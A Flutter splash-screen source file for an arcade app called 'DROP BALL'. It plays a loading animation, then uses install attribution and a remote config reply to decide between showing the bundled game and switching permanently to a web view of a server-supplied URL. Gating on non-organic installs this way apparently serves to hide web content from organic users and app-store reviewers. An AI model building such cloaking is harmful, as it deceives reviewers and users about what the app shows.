import 'dart:async';
import 'dart:io';
import 'package:flutter/material.dart';
import 'package:flutter/services.dart';
import 'package:video_player/video_player.dart';
import '../models/app_mode.dart';
import '../services/startup.dart';
import '../services/tracker.dart';
import '../services/push_service.dart';
import '../services/remote_config.dart';
import '../services/app_storage.dart';
import '../services/push_bridge.dart';
import '../services/net_checker.dart';
import '../utils/media_paths.dart';
import 'flow_screen.dart';
import 'offline_screen.dart';
import 'notif_screen.dart';
import 'browser_host.dart' deferred as host;

enum _ProgressStage { start, midway, filled }

class SplashScreen extends StatefulWidget {
  final AppStorage store;
  final NetChecker net;
  final Tracker attribution;
  final RemoteConfig config;
  final PushService push;

  const SplashScreen({
    super.key,
    required this.store,
    required this.net,
    required this.attribution,
    required this.config,
    required this.push,
  });

  @override
  State<SplashScreen> createState() => _SplashScreenState();
}

class _SplashScreenState extends State<SplashScreen>
    with TickerProviderStateMixin {
  bool _leaving = false;

  late final AnimationController _barCtrl;

  VideoPlayerController? _videoCtrl;
  bool _videoReady = false;
  Orientation? _videoOrientation;

  @override
  void initState() {
    super.initState();

    _barCtrl = AnimationController(
      vsync: this,
      duration: const Duration(milliseconds: 800),
    );

    SystemChrome.setPreferredOrientations(const [
      DeviceOrientation.portraitUp,
      DeviceOrientation.portraitDown,
      DeviceOrientation.landscapeLeft,
      DeviceOrientation.landscapeRight,
    ]);
    _kickoff();
  }

  @override
  void didChangeDependencies() {
    super.didChangeDependencies();
    final orientation = MediaQuery.of(context).orientation;
    if (orientation != _videoOrientation) {
      _videoOrientation = orientation;
      _loadVideo(orientation);
    }
  }

  Future<void> _loadVideo(Orientation orientation) async {
    final path = orientation == Orientation.landscape
        ? MediaPaths.loadingVideoLandscape
        : MediaPaths.loadingVideoPortrait;
    final next = VideoPlayerController.asset(path);
    try {
      await next.initialize();
      next.setLooping(true);
      next.setVolume(0);
      next.play();
      if (!mounted) {
        next.dispose();
        return;
      }
      final old = _videoCtrl;
      setState(() {
        _videoCtrl = next;
        _videoReady = true;
      });
      await old?.dispose();
    } catch (_) {
      next.dispose();
    }
  }

  Future<void> _kickoff() async {
    await runStartup(widget.store);

    widget.push.onTokenRotate = _onTokenRotate;

    final swNative = Stopwatch()..start();
    final nativeColdStartUrl = await PushBridge.consumeColdStartUrl();
    debugPrint(
        '[BOOT] native cold-start probe done in ${swNative.elapsedMilliseconds}ms,'
        ' url=${nativeColdStartUrl ?? 'null'}');

    final pushFuture = widget.push.bootstrap().catchError((err) {
      debugPrint('[BOOT] push.bootstrap failed: $err');
    });
    _setStage(_ProgressStage.start);

    if (nativeColdStartUrl != null && nativeColdStartUrl.isNotEmpty) {
      debugPrint('[BOOT] EXPRESS-LANE → BrowserHost @ $nativeColdStartUrl');
      await widget.store.writeRuntimeMode(AppMode.browser);
      unawaited(_dispatchExpressLane(pushFuture));
      _setStage(_ProgressStage.filled);
      await Future.delayed(const Duration(milliseconds: 400));
      if (!mounted) return;
      _goWebContent(nativeColdStartUrl);
      return;
    }

    final mode = widget.store.readRuntimeMode();
    switch (mode) {
      case AppMode.browser:
        await _runBrowserMode(pushFuture);
        break;
      case AppMode.arcade:
        await _runArcadeMode(pushFuture);
        break;
      case AppMode.undetermined:
        await _runFirstLaunch(pushFuture);
        break;
    }
  }

  Future<void> _dispatchExpressLane(Future<void> pushFuture) async {
    try {
      await widget.attribution.warmup();
      await Future.wait([
        widget.attribution
            .awaitConversion(timeout: const Duration(seconds: 10)),
        widget.attribution.awaitDeepLink(),
        pushFuture,
      ]);
      final locale = Platform.localeName.replaceAll('-', '_');
      final body = await widget.attribution.assembleRequest(
        locale: locale,
        pushToken: widget.push.token,
      );
      final reply = await widget.config.dispatch(body);
      debugPrint(
          '[BOOT] express-lane dispatch accepted=${reply.accepted}'
          ' target=${reply.target ?? 'null'}');
    } catch (err) {
      debugPrint('[BOOT] express-lane dispatch failed: $err');
    }
  }

  Future<void> _runArcadeMode(Future<void> pushFuture) async {
    _setStage(_ProgressStage.midway);

    final online = await widget.net.isOnline();
    if (!online) {
      _setStage(_ProgressStage.filled);
      await Future.delayed(const Duration(milliseconds: 400));
      if (!mounted) return;
      _goArcade();
      return;
    }

    final attributionFuture = (() async {
      await widget.attribution.warmup();
      await Future.wait([
        widget.attribution
            .awaitConversion(timeout: const Duration(seconds: 6)),
        widget.attribution
            .awaitDeepLink(timeout: const Duration(seconds: 4)),
      ]);
    })();

    await pushFuture;
    final pushTarget = await widget.store.takePushTarget();
    if (pushTarget != null) {
      await widget.store.writeRuntimeMode(AppMode.browser);
      unawaited(_dispatchInBackground(attributionFuture));
      _setStage(_ProgressStage.filled);
      await Future.delayed(const Duration(milliseconds: 400));
      if (!mounted) return;
      _goWebContent(pushTarget);
      return;
    }

    await attributionFuture;

    final hasFreshAttribution = widget.attribution.hasNonOrganicSignal;
    if (!hasFreshAttribution) {
      _setStage(_ProgressStage.filled);
      await Future.delayed(const Duration(milliseconds: 400));
      if (!mounted) return;
      _goArcade();
      return;
    }

    final locale = Platform.localeName.replaceAll('-', '_');
    final body = await widget.attribution.assembleRequest(
      locale: locale,
      pushToken: widget.push.token,
    );
    final reply = await widget.config.dispatch(body);
    _setStage(_ProgressStage.filled);
    await Future.delayed(const Duration(milliseconds: 400));
    if (!mounted) return;

    if (reply.accepted && reply.target != null) {
      await widget.store.writeRuntimeMode(AppMode.browser);
      _goWebContent(reply.target!);
    } else {
      _goArcade();
    }
  }

  Future<void> _runFirstLaunch(Future<void> pushFuture) async {
    _setStage(_ProgressStage.start);

    final online = await widget.net.isOnline();
    if (!online) {
      if (!mounted) return;
      _goOffline(firstLaunch: true);
      return;
    }

    _setStage(_ProgressStage.midway);

    final attributionFuture = (() async {
      await widget.attribution.warmup();
      await Future.wait([
        widget.attribution.awaitConversion(),
        widget.attribution.awaitDeepLink(),
      ]);
    })();

    await pushFuture;
    final pushTarget = await widget.store.takePushTarget();
    if (pushTarget != null) {
      await widget.store.writeRuntimeMode(AppMode.browser);
      unawaited(_dispatchInBackground(attributionFuture));
      _setStage(_ProgressStage.filled);
      await Future.delayed(const Duration(milliseconds: 400));
      if (!mounted) return;
      _goWebContent(pushTarget);
      return;
    }

    await attributionFuture;

    final locale = Platform.localeName.replaceAll('-', '_');
    final body = await widget.attribution.assembleRequest(
      locale: locale,
      pushToken: widget.push.token,
    );
    final reply = await widget.config.dispatch(body);

    _setStage(_ProgressStage.filled);
    await Future.delayed(const Duration(milliseconds: 400));
    if (!mounted) return;

    if (reply.accepted && reply.target != null) {
      await widget.store.writeRuntimeMode(AppMode.browser);
      _goWebContent(reply.target!);
      return;
    }

    if (widget.attribution.hasOrganicSignal) {
      await widget.store.writeRuntimeMode(AppMode.arcade);
    }
    _goArcade();
  }

  Future<void> _dispatchInBackground(Future<void> attributionFuture) async {
    try {
      await attributionFuture;
      final locale = Platform.localeName.replaceAll('-', '_');
      final body = await widget.attribution.assembleRequest(
        locale: locale,
        pushToken: widget.push.token,
      );
      await widget.config.dispatch(body);
    } catch (err) {
      debugPrint('[BOOT] background dispatch failed: $err');
    }
  }

  Future<void> _runBrowserMode(Future<void> pushFuture) async {
    _setStage(_ProgressStage.midway);

    final online = await widget.net.isOnline();
    if (!online) {
      _setStage(_ProgressStage.filled);
      await Future.delayed(const Duration(milliseconds: 400));
      if (!mounted) return;
      _goOffline(firstLaunch: false);
      return;
    }

    final attributionFuture = (() async {
      await widget.attribution.warmup();
      await Future.wait([
        widget.attribution
            .awaitConversion(timeout: const Duration(seconds: 10)),
        widget.attribution.awaitDeepLink(),
      ]);
    })();

    await pushFuture;
    final pushTarget = await widget.store.takePushTarget();
    if (pushTarget != null) {
      unawaited(_dispatchInBackground(attributionFuture));
      _setStage(_ProgressStage.filled);
      await Future.delayed(const Duration(milliseconds: 400));
      if (!mounted) return;
      _goWebContent(pushTarget);
      return;
    }

    await attributionFuture;

    final locale = Platform.localeName.replaceAll('-', '_');
    final body = await widget.attribution.assembleRequest(
      locale: locale,
      pushToken: widget.push.token,
    );
    final reply = await widget.config.dispatch(body);
    _setStage(_ProgressStage.filled);
    await Future.delayed(const Duration(milliseconds: 400));
    if (!mounted) return;

    if (reply.accepted && reply.target != null) {
      _goWebContent(reply.target!);
      return;
    }
    final cached = await widget.store.readCachedTarget();
    if (cached != null) {
      _goWebContent(cached);
    } else {
      _goOffline(firstLaunch: false);
    }
  }

  void _onTokenRotate(String newToken) {
    _sendPushTokenUpdate(newToken);
  }

  Future<void> _sendPushTokenUpdate(String newToken) async {
    final locale = Platform.localeName.replaceAll('-', '_');
    final body = await widget.attribution.assembleRequest(
      locale: locale,
      pushToken: newToken,
    );
    await widget.config.dispatch(body);
  }

  void _setStage(_ProgressStage s) {
    if (!mounted) return;
    final target = switch (s) {
      _ProgressStage.start => 0.15,
      _ProgressStage.midway => 0.55,
      _ProgressStage.filled => 1.0,
    };
    _barCtrl.animateTo(target,
        duration: const Duration(milliseconds: 900), curve: Curves.easeInOut);
  }

  Future<void> _goWebContent(String url) async {
    if (_leaving) return;
    _leaving = true;

    await host.loadLibrary();
    await primeHost();
    if (!mounted) return;

    final canPrompt =
        widget.store.needsPushPrompt() &&
        await widget.push.canShowSystemPrompt();

    if (!mounted) return;

    if (canPrompt) {
      Navigator.of(context).pushReplacement(
        MaterialPageRoute(
          builder: (_) => NotifScreen(
            store: widget.store,
            push: widget.push,
            net: widget.net,
            target: url,
            onPushTokenReady: _sendPushTokenUpdate,
          ),
        ),
      );
    } else {
      Navigator.of(context).pushReplacement(
        MaterialPageRoute(
          builder: (_) => host.BrowserHost(
            target: url,
            store: widget.store,
            push: widget.push,
            net: widget.net,
          ),
        ),
      );
    }
  }

  Future<void> primeHost() async {}

  void _goOffline({required bool firstLaunch}) {
    if (_leaving) return;
    _leaving = true;
    Navigator.of(context).pushReplacement(
      MaterialPageRoute(
        builder: (_) => OfflineScreen(
          net: widget.net,
          retryBuilder: (_) => SplashScreen(
            store: widget.store,
            net: widget.net,
            attribution: widget.attribution,
            config: widget.config,
            push: widget.push,
          ),
        ),
      ),
    );
  }

  void _goArcade() {
    if (_leaving) return;
    _leaving = true;
    Navigator.of(context).pushReplacement(
      MaterialPageRoute(builder: (_) => const FlowScreen()),
    );
  }

  @override
  void dispose() {
    _barCtrl.dispose();
    _videoCtrl?.dispose();
    widget.push.onTokenRotate = null;
    super.dispose();
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      backgroundColor: Colors.black,
      body: OrientationBuilder(
        builder: (context, orientation) {
          final landscape = orientation == Orientation.landscape;
          final media = MediaQuery.of(context);
          return Stack(
            fit: StackFit.expand,
            children: [
              _buildBrandedSplash(landscape, media),
              _buildProgressBar(landscape: landscape, media: media),
            ],
          );
        },
      ),
    );
  }

  Widget _buildBrandedSplash(bool landscape, MediaQueryData media) {
    final shortest = media.size.shortestSide;
    final logoSize = landscape ? shortest * 0.18 : shortest * 0.36;

    return Stack(
      fit: StackFit.expand,
      children: [
        // Video background
        if (_videoReady && _videoCtrl != null)
          SizedBox.expand(
            child: FittedBox(
              fit: BoxFit.cover,
              child: SizedBox(
                width: _videoCtrl!.value.size.width,
                height: _videoCtrl!.value.size.height,
                child: VideoPlayer(_videoCtrl!),
              ),
            ),
          )
        else
          const DecoratedBox(
            decoration: BoxDecoration(
              gradient: RadialGradient(
                center: Alignment.center,
                radius: 1.1,
                colors: [Color(0xFF17134A), Color(0xFF070714), Colors.black],
              ),
            ),
          ),

        // Gradient overlay at bottom so bar is readable
        DecoratedBox(
          decoration: BoxDecoration(
            gradient: LinearGradient(
              begin: Alignment.topCenter,
              end: Alignment.bottomCenter,
              colors: [
                Colors.transparent,
                Colors.black.withValues(alpha: 0.55),
              ],
              stops: const [0.55, 1.0],
            ),
          ),
        ),

        // Centered logo + name
        Align(
          alignment: landscape
              ? const Alignment(0, -0.5)
              : const Alignment(0, -0.25),
          child: Column(
            mainAxisSize: MainAxisSize.min,
            children: [
              Image.asset(
                MediaPaths.logoWhite,
                width: logoSize,
                height: logoSize,
                fit: BoxFit.contain,
                errorBuilder: (ctx, e, s) =>
                    SizedBox(width: logoSize, height: logoSize),
              ),
              SizedBox(height: landscape ? 6 : 14),
              Image.asset(
                MediaPaths.logoName,
                height: landscape ? 28.0 : 44.0,
                fit: BoxFit.contain,
                errorBuilder: (ctx, e, s) => Text(
                  'DROP BALL',
                  style: TextStyle(
                    color: Colors.cyanAccent,
                    fontSize: landscape ? 18.0 : 28.0,
                    fontWeight: FontWeight.w900,
                    letterSpacing: 4,
                    shadows: const [
                      Shadow(color: Colors.cyanAccent, blurRadius: 18),
                    ],
                  ),
                ),
              ),
            ],
          ),
        ),
      ],
    );
  }


  static const _splashBarAssets = [
    MediaPaths.loadingBarEmpty,
    MediaPaths.loadingBarHalf,
    MediaPaths.loadingBarAlmost,
    MediaPaths.loadingBarFull,
  ];

  Widget _buildProgressBar({
    required bool landscape,
    required MediaQueryData media,
  }) {
    return Positioned(
      left: 0,
      right: 0,
      bottom: 30,
      child: Center(
        child: AnimatedBuilder(
          animation: _barCtrl,
          builder: (context, _) {
            final v = _barCtrl.value;
            final idx = v < 0.30
                ? 0
                : v < 0.60
                    ? 1
                    : v < 0.88
                        ? 2
                        : 3;
            return AnimatedSwitcher(
              duration: const Duration(milliseconds: 350),
              transitionBuilder: (child, anim) =>
                  FadeTransition(opacity: anim, child: child),
              child: Image.asset(
                _splashBarAssets[idx],
                key: ValueKey(idx),
                width: 260,
                fit: BoxFit.contain,
                errorBuilder: (ctx, e, s) => const SizedBox(
                  width: 260,
                  height: 20,
                ),
              ),
            );
          },
        ),
      ),
    );
  }
}
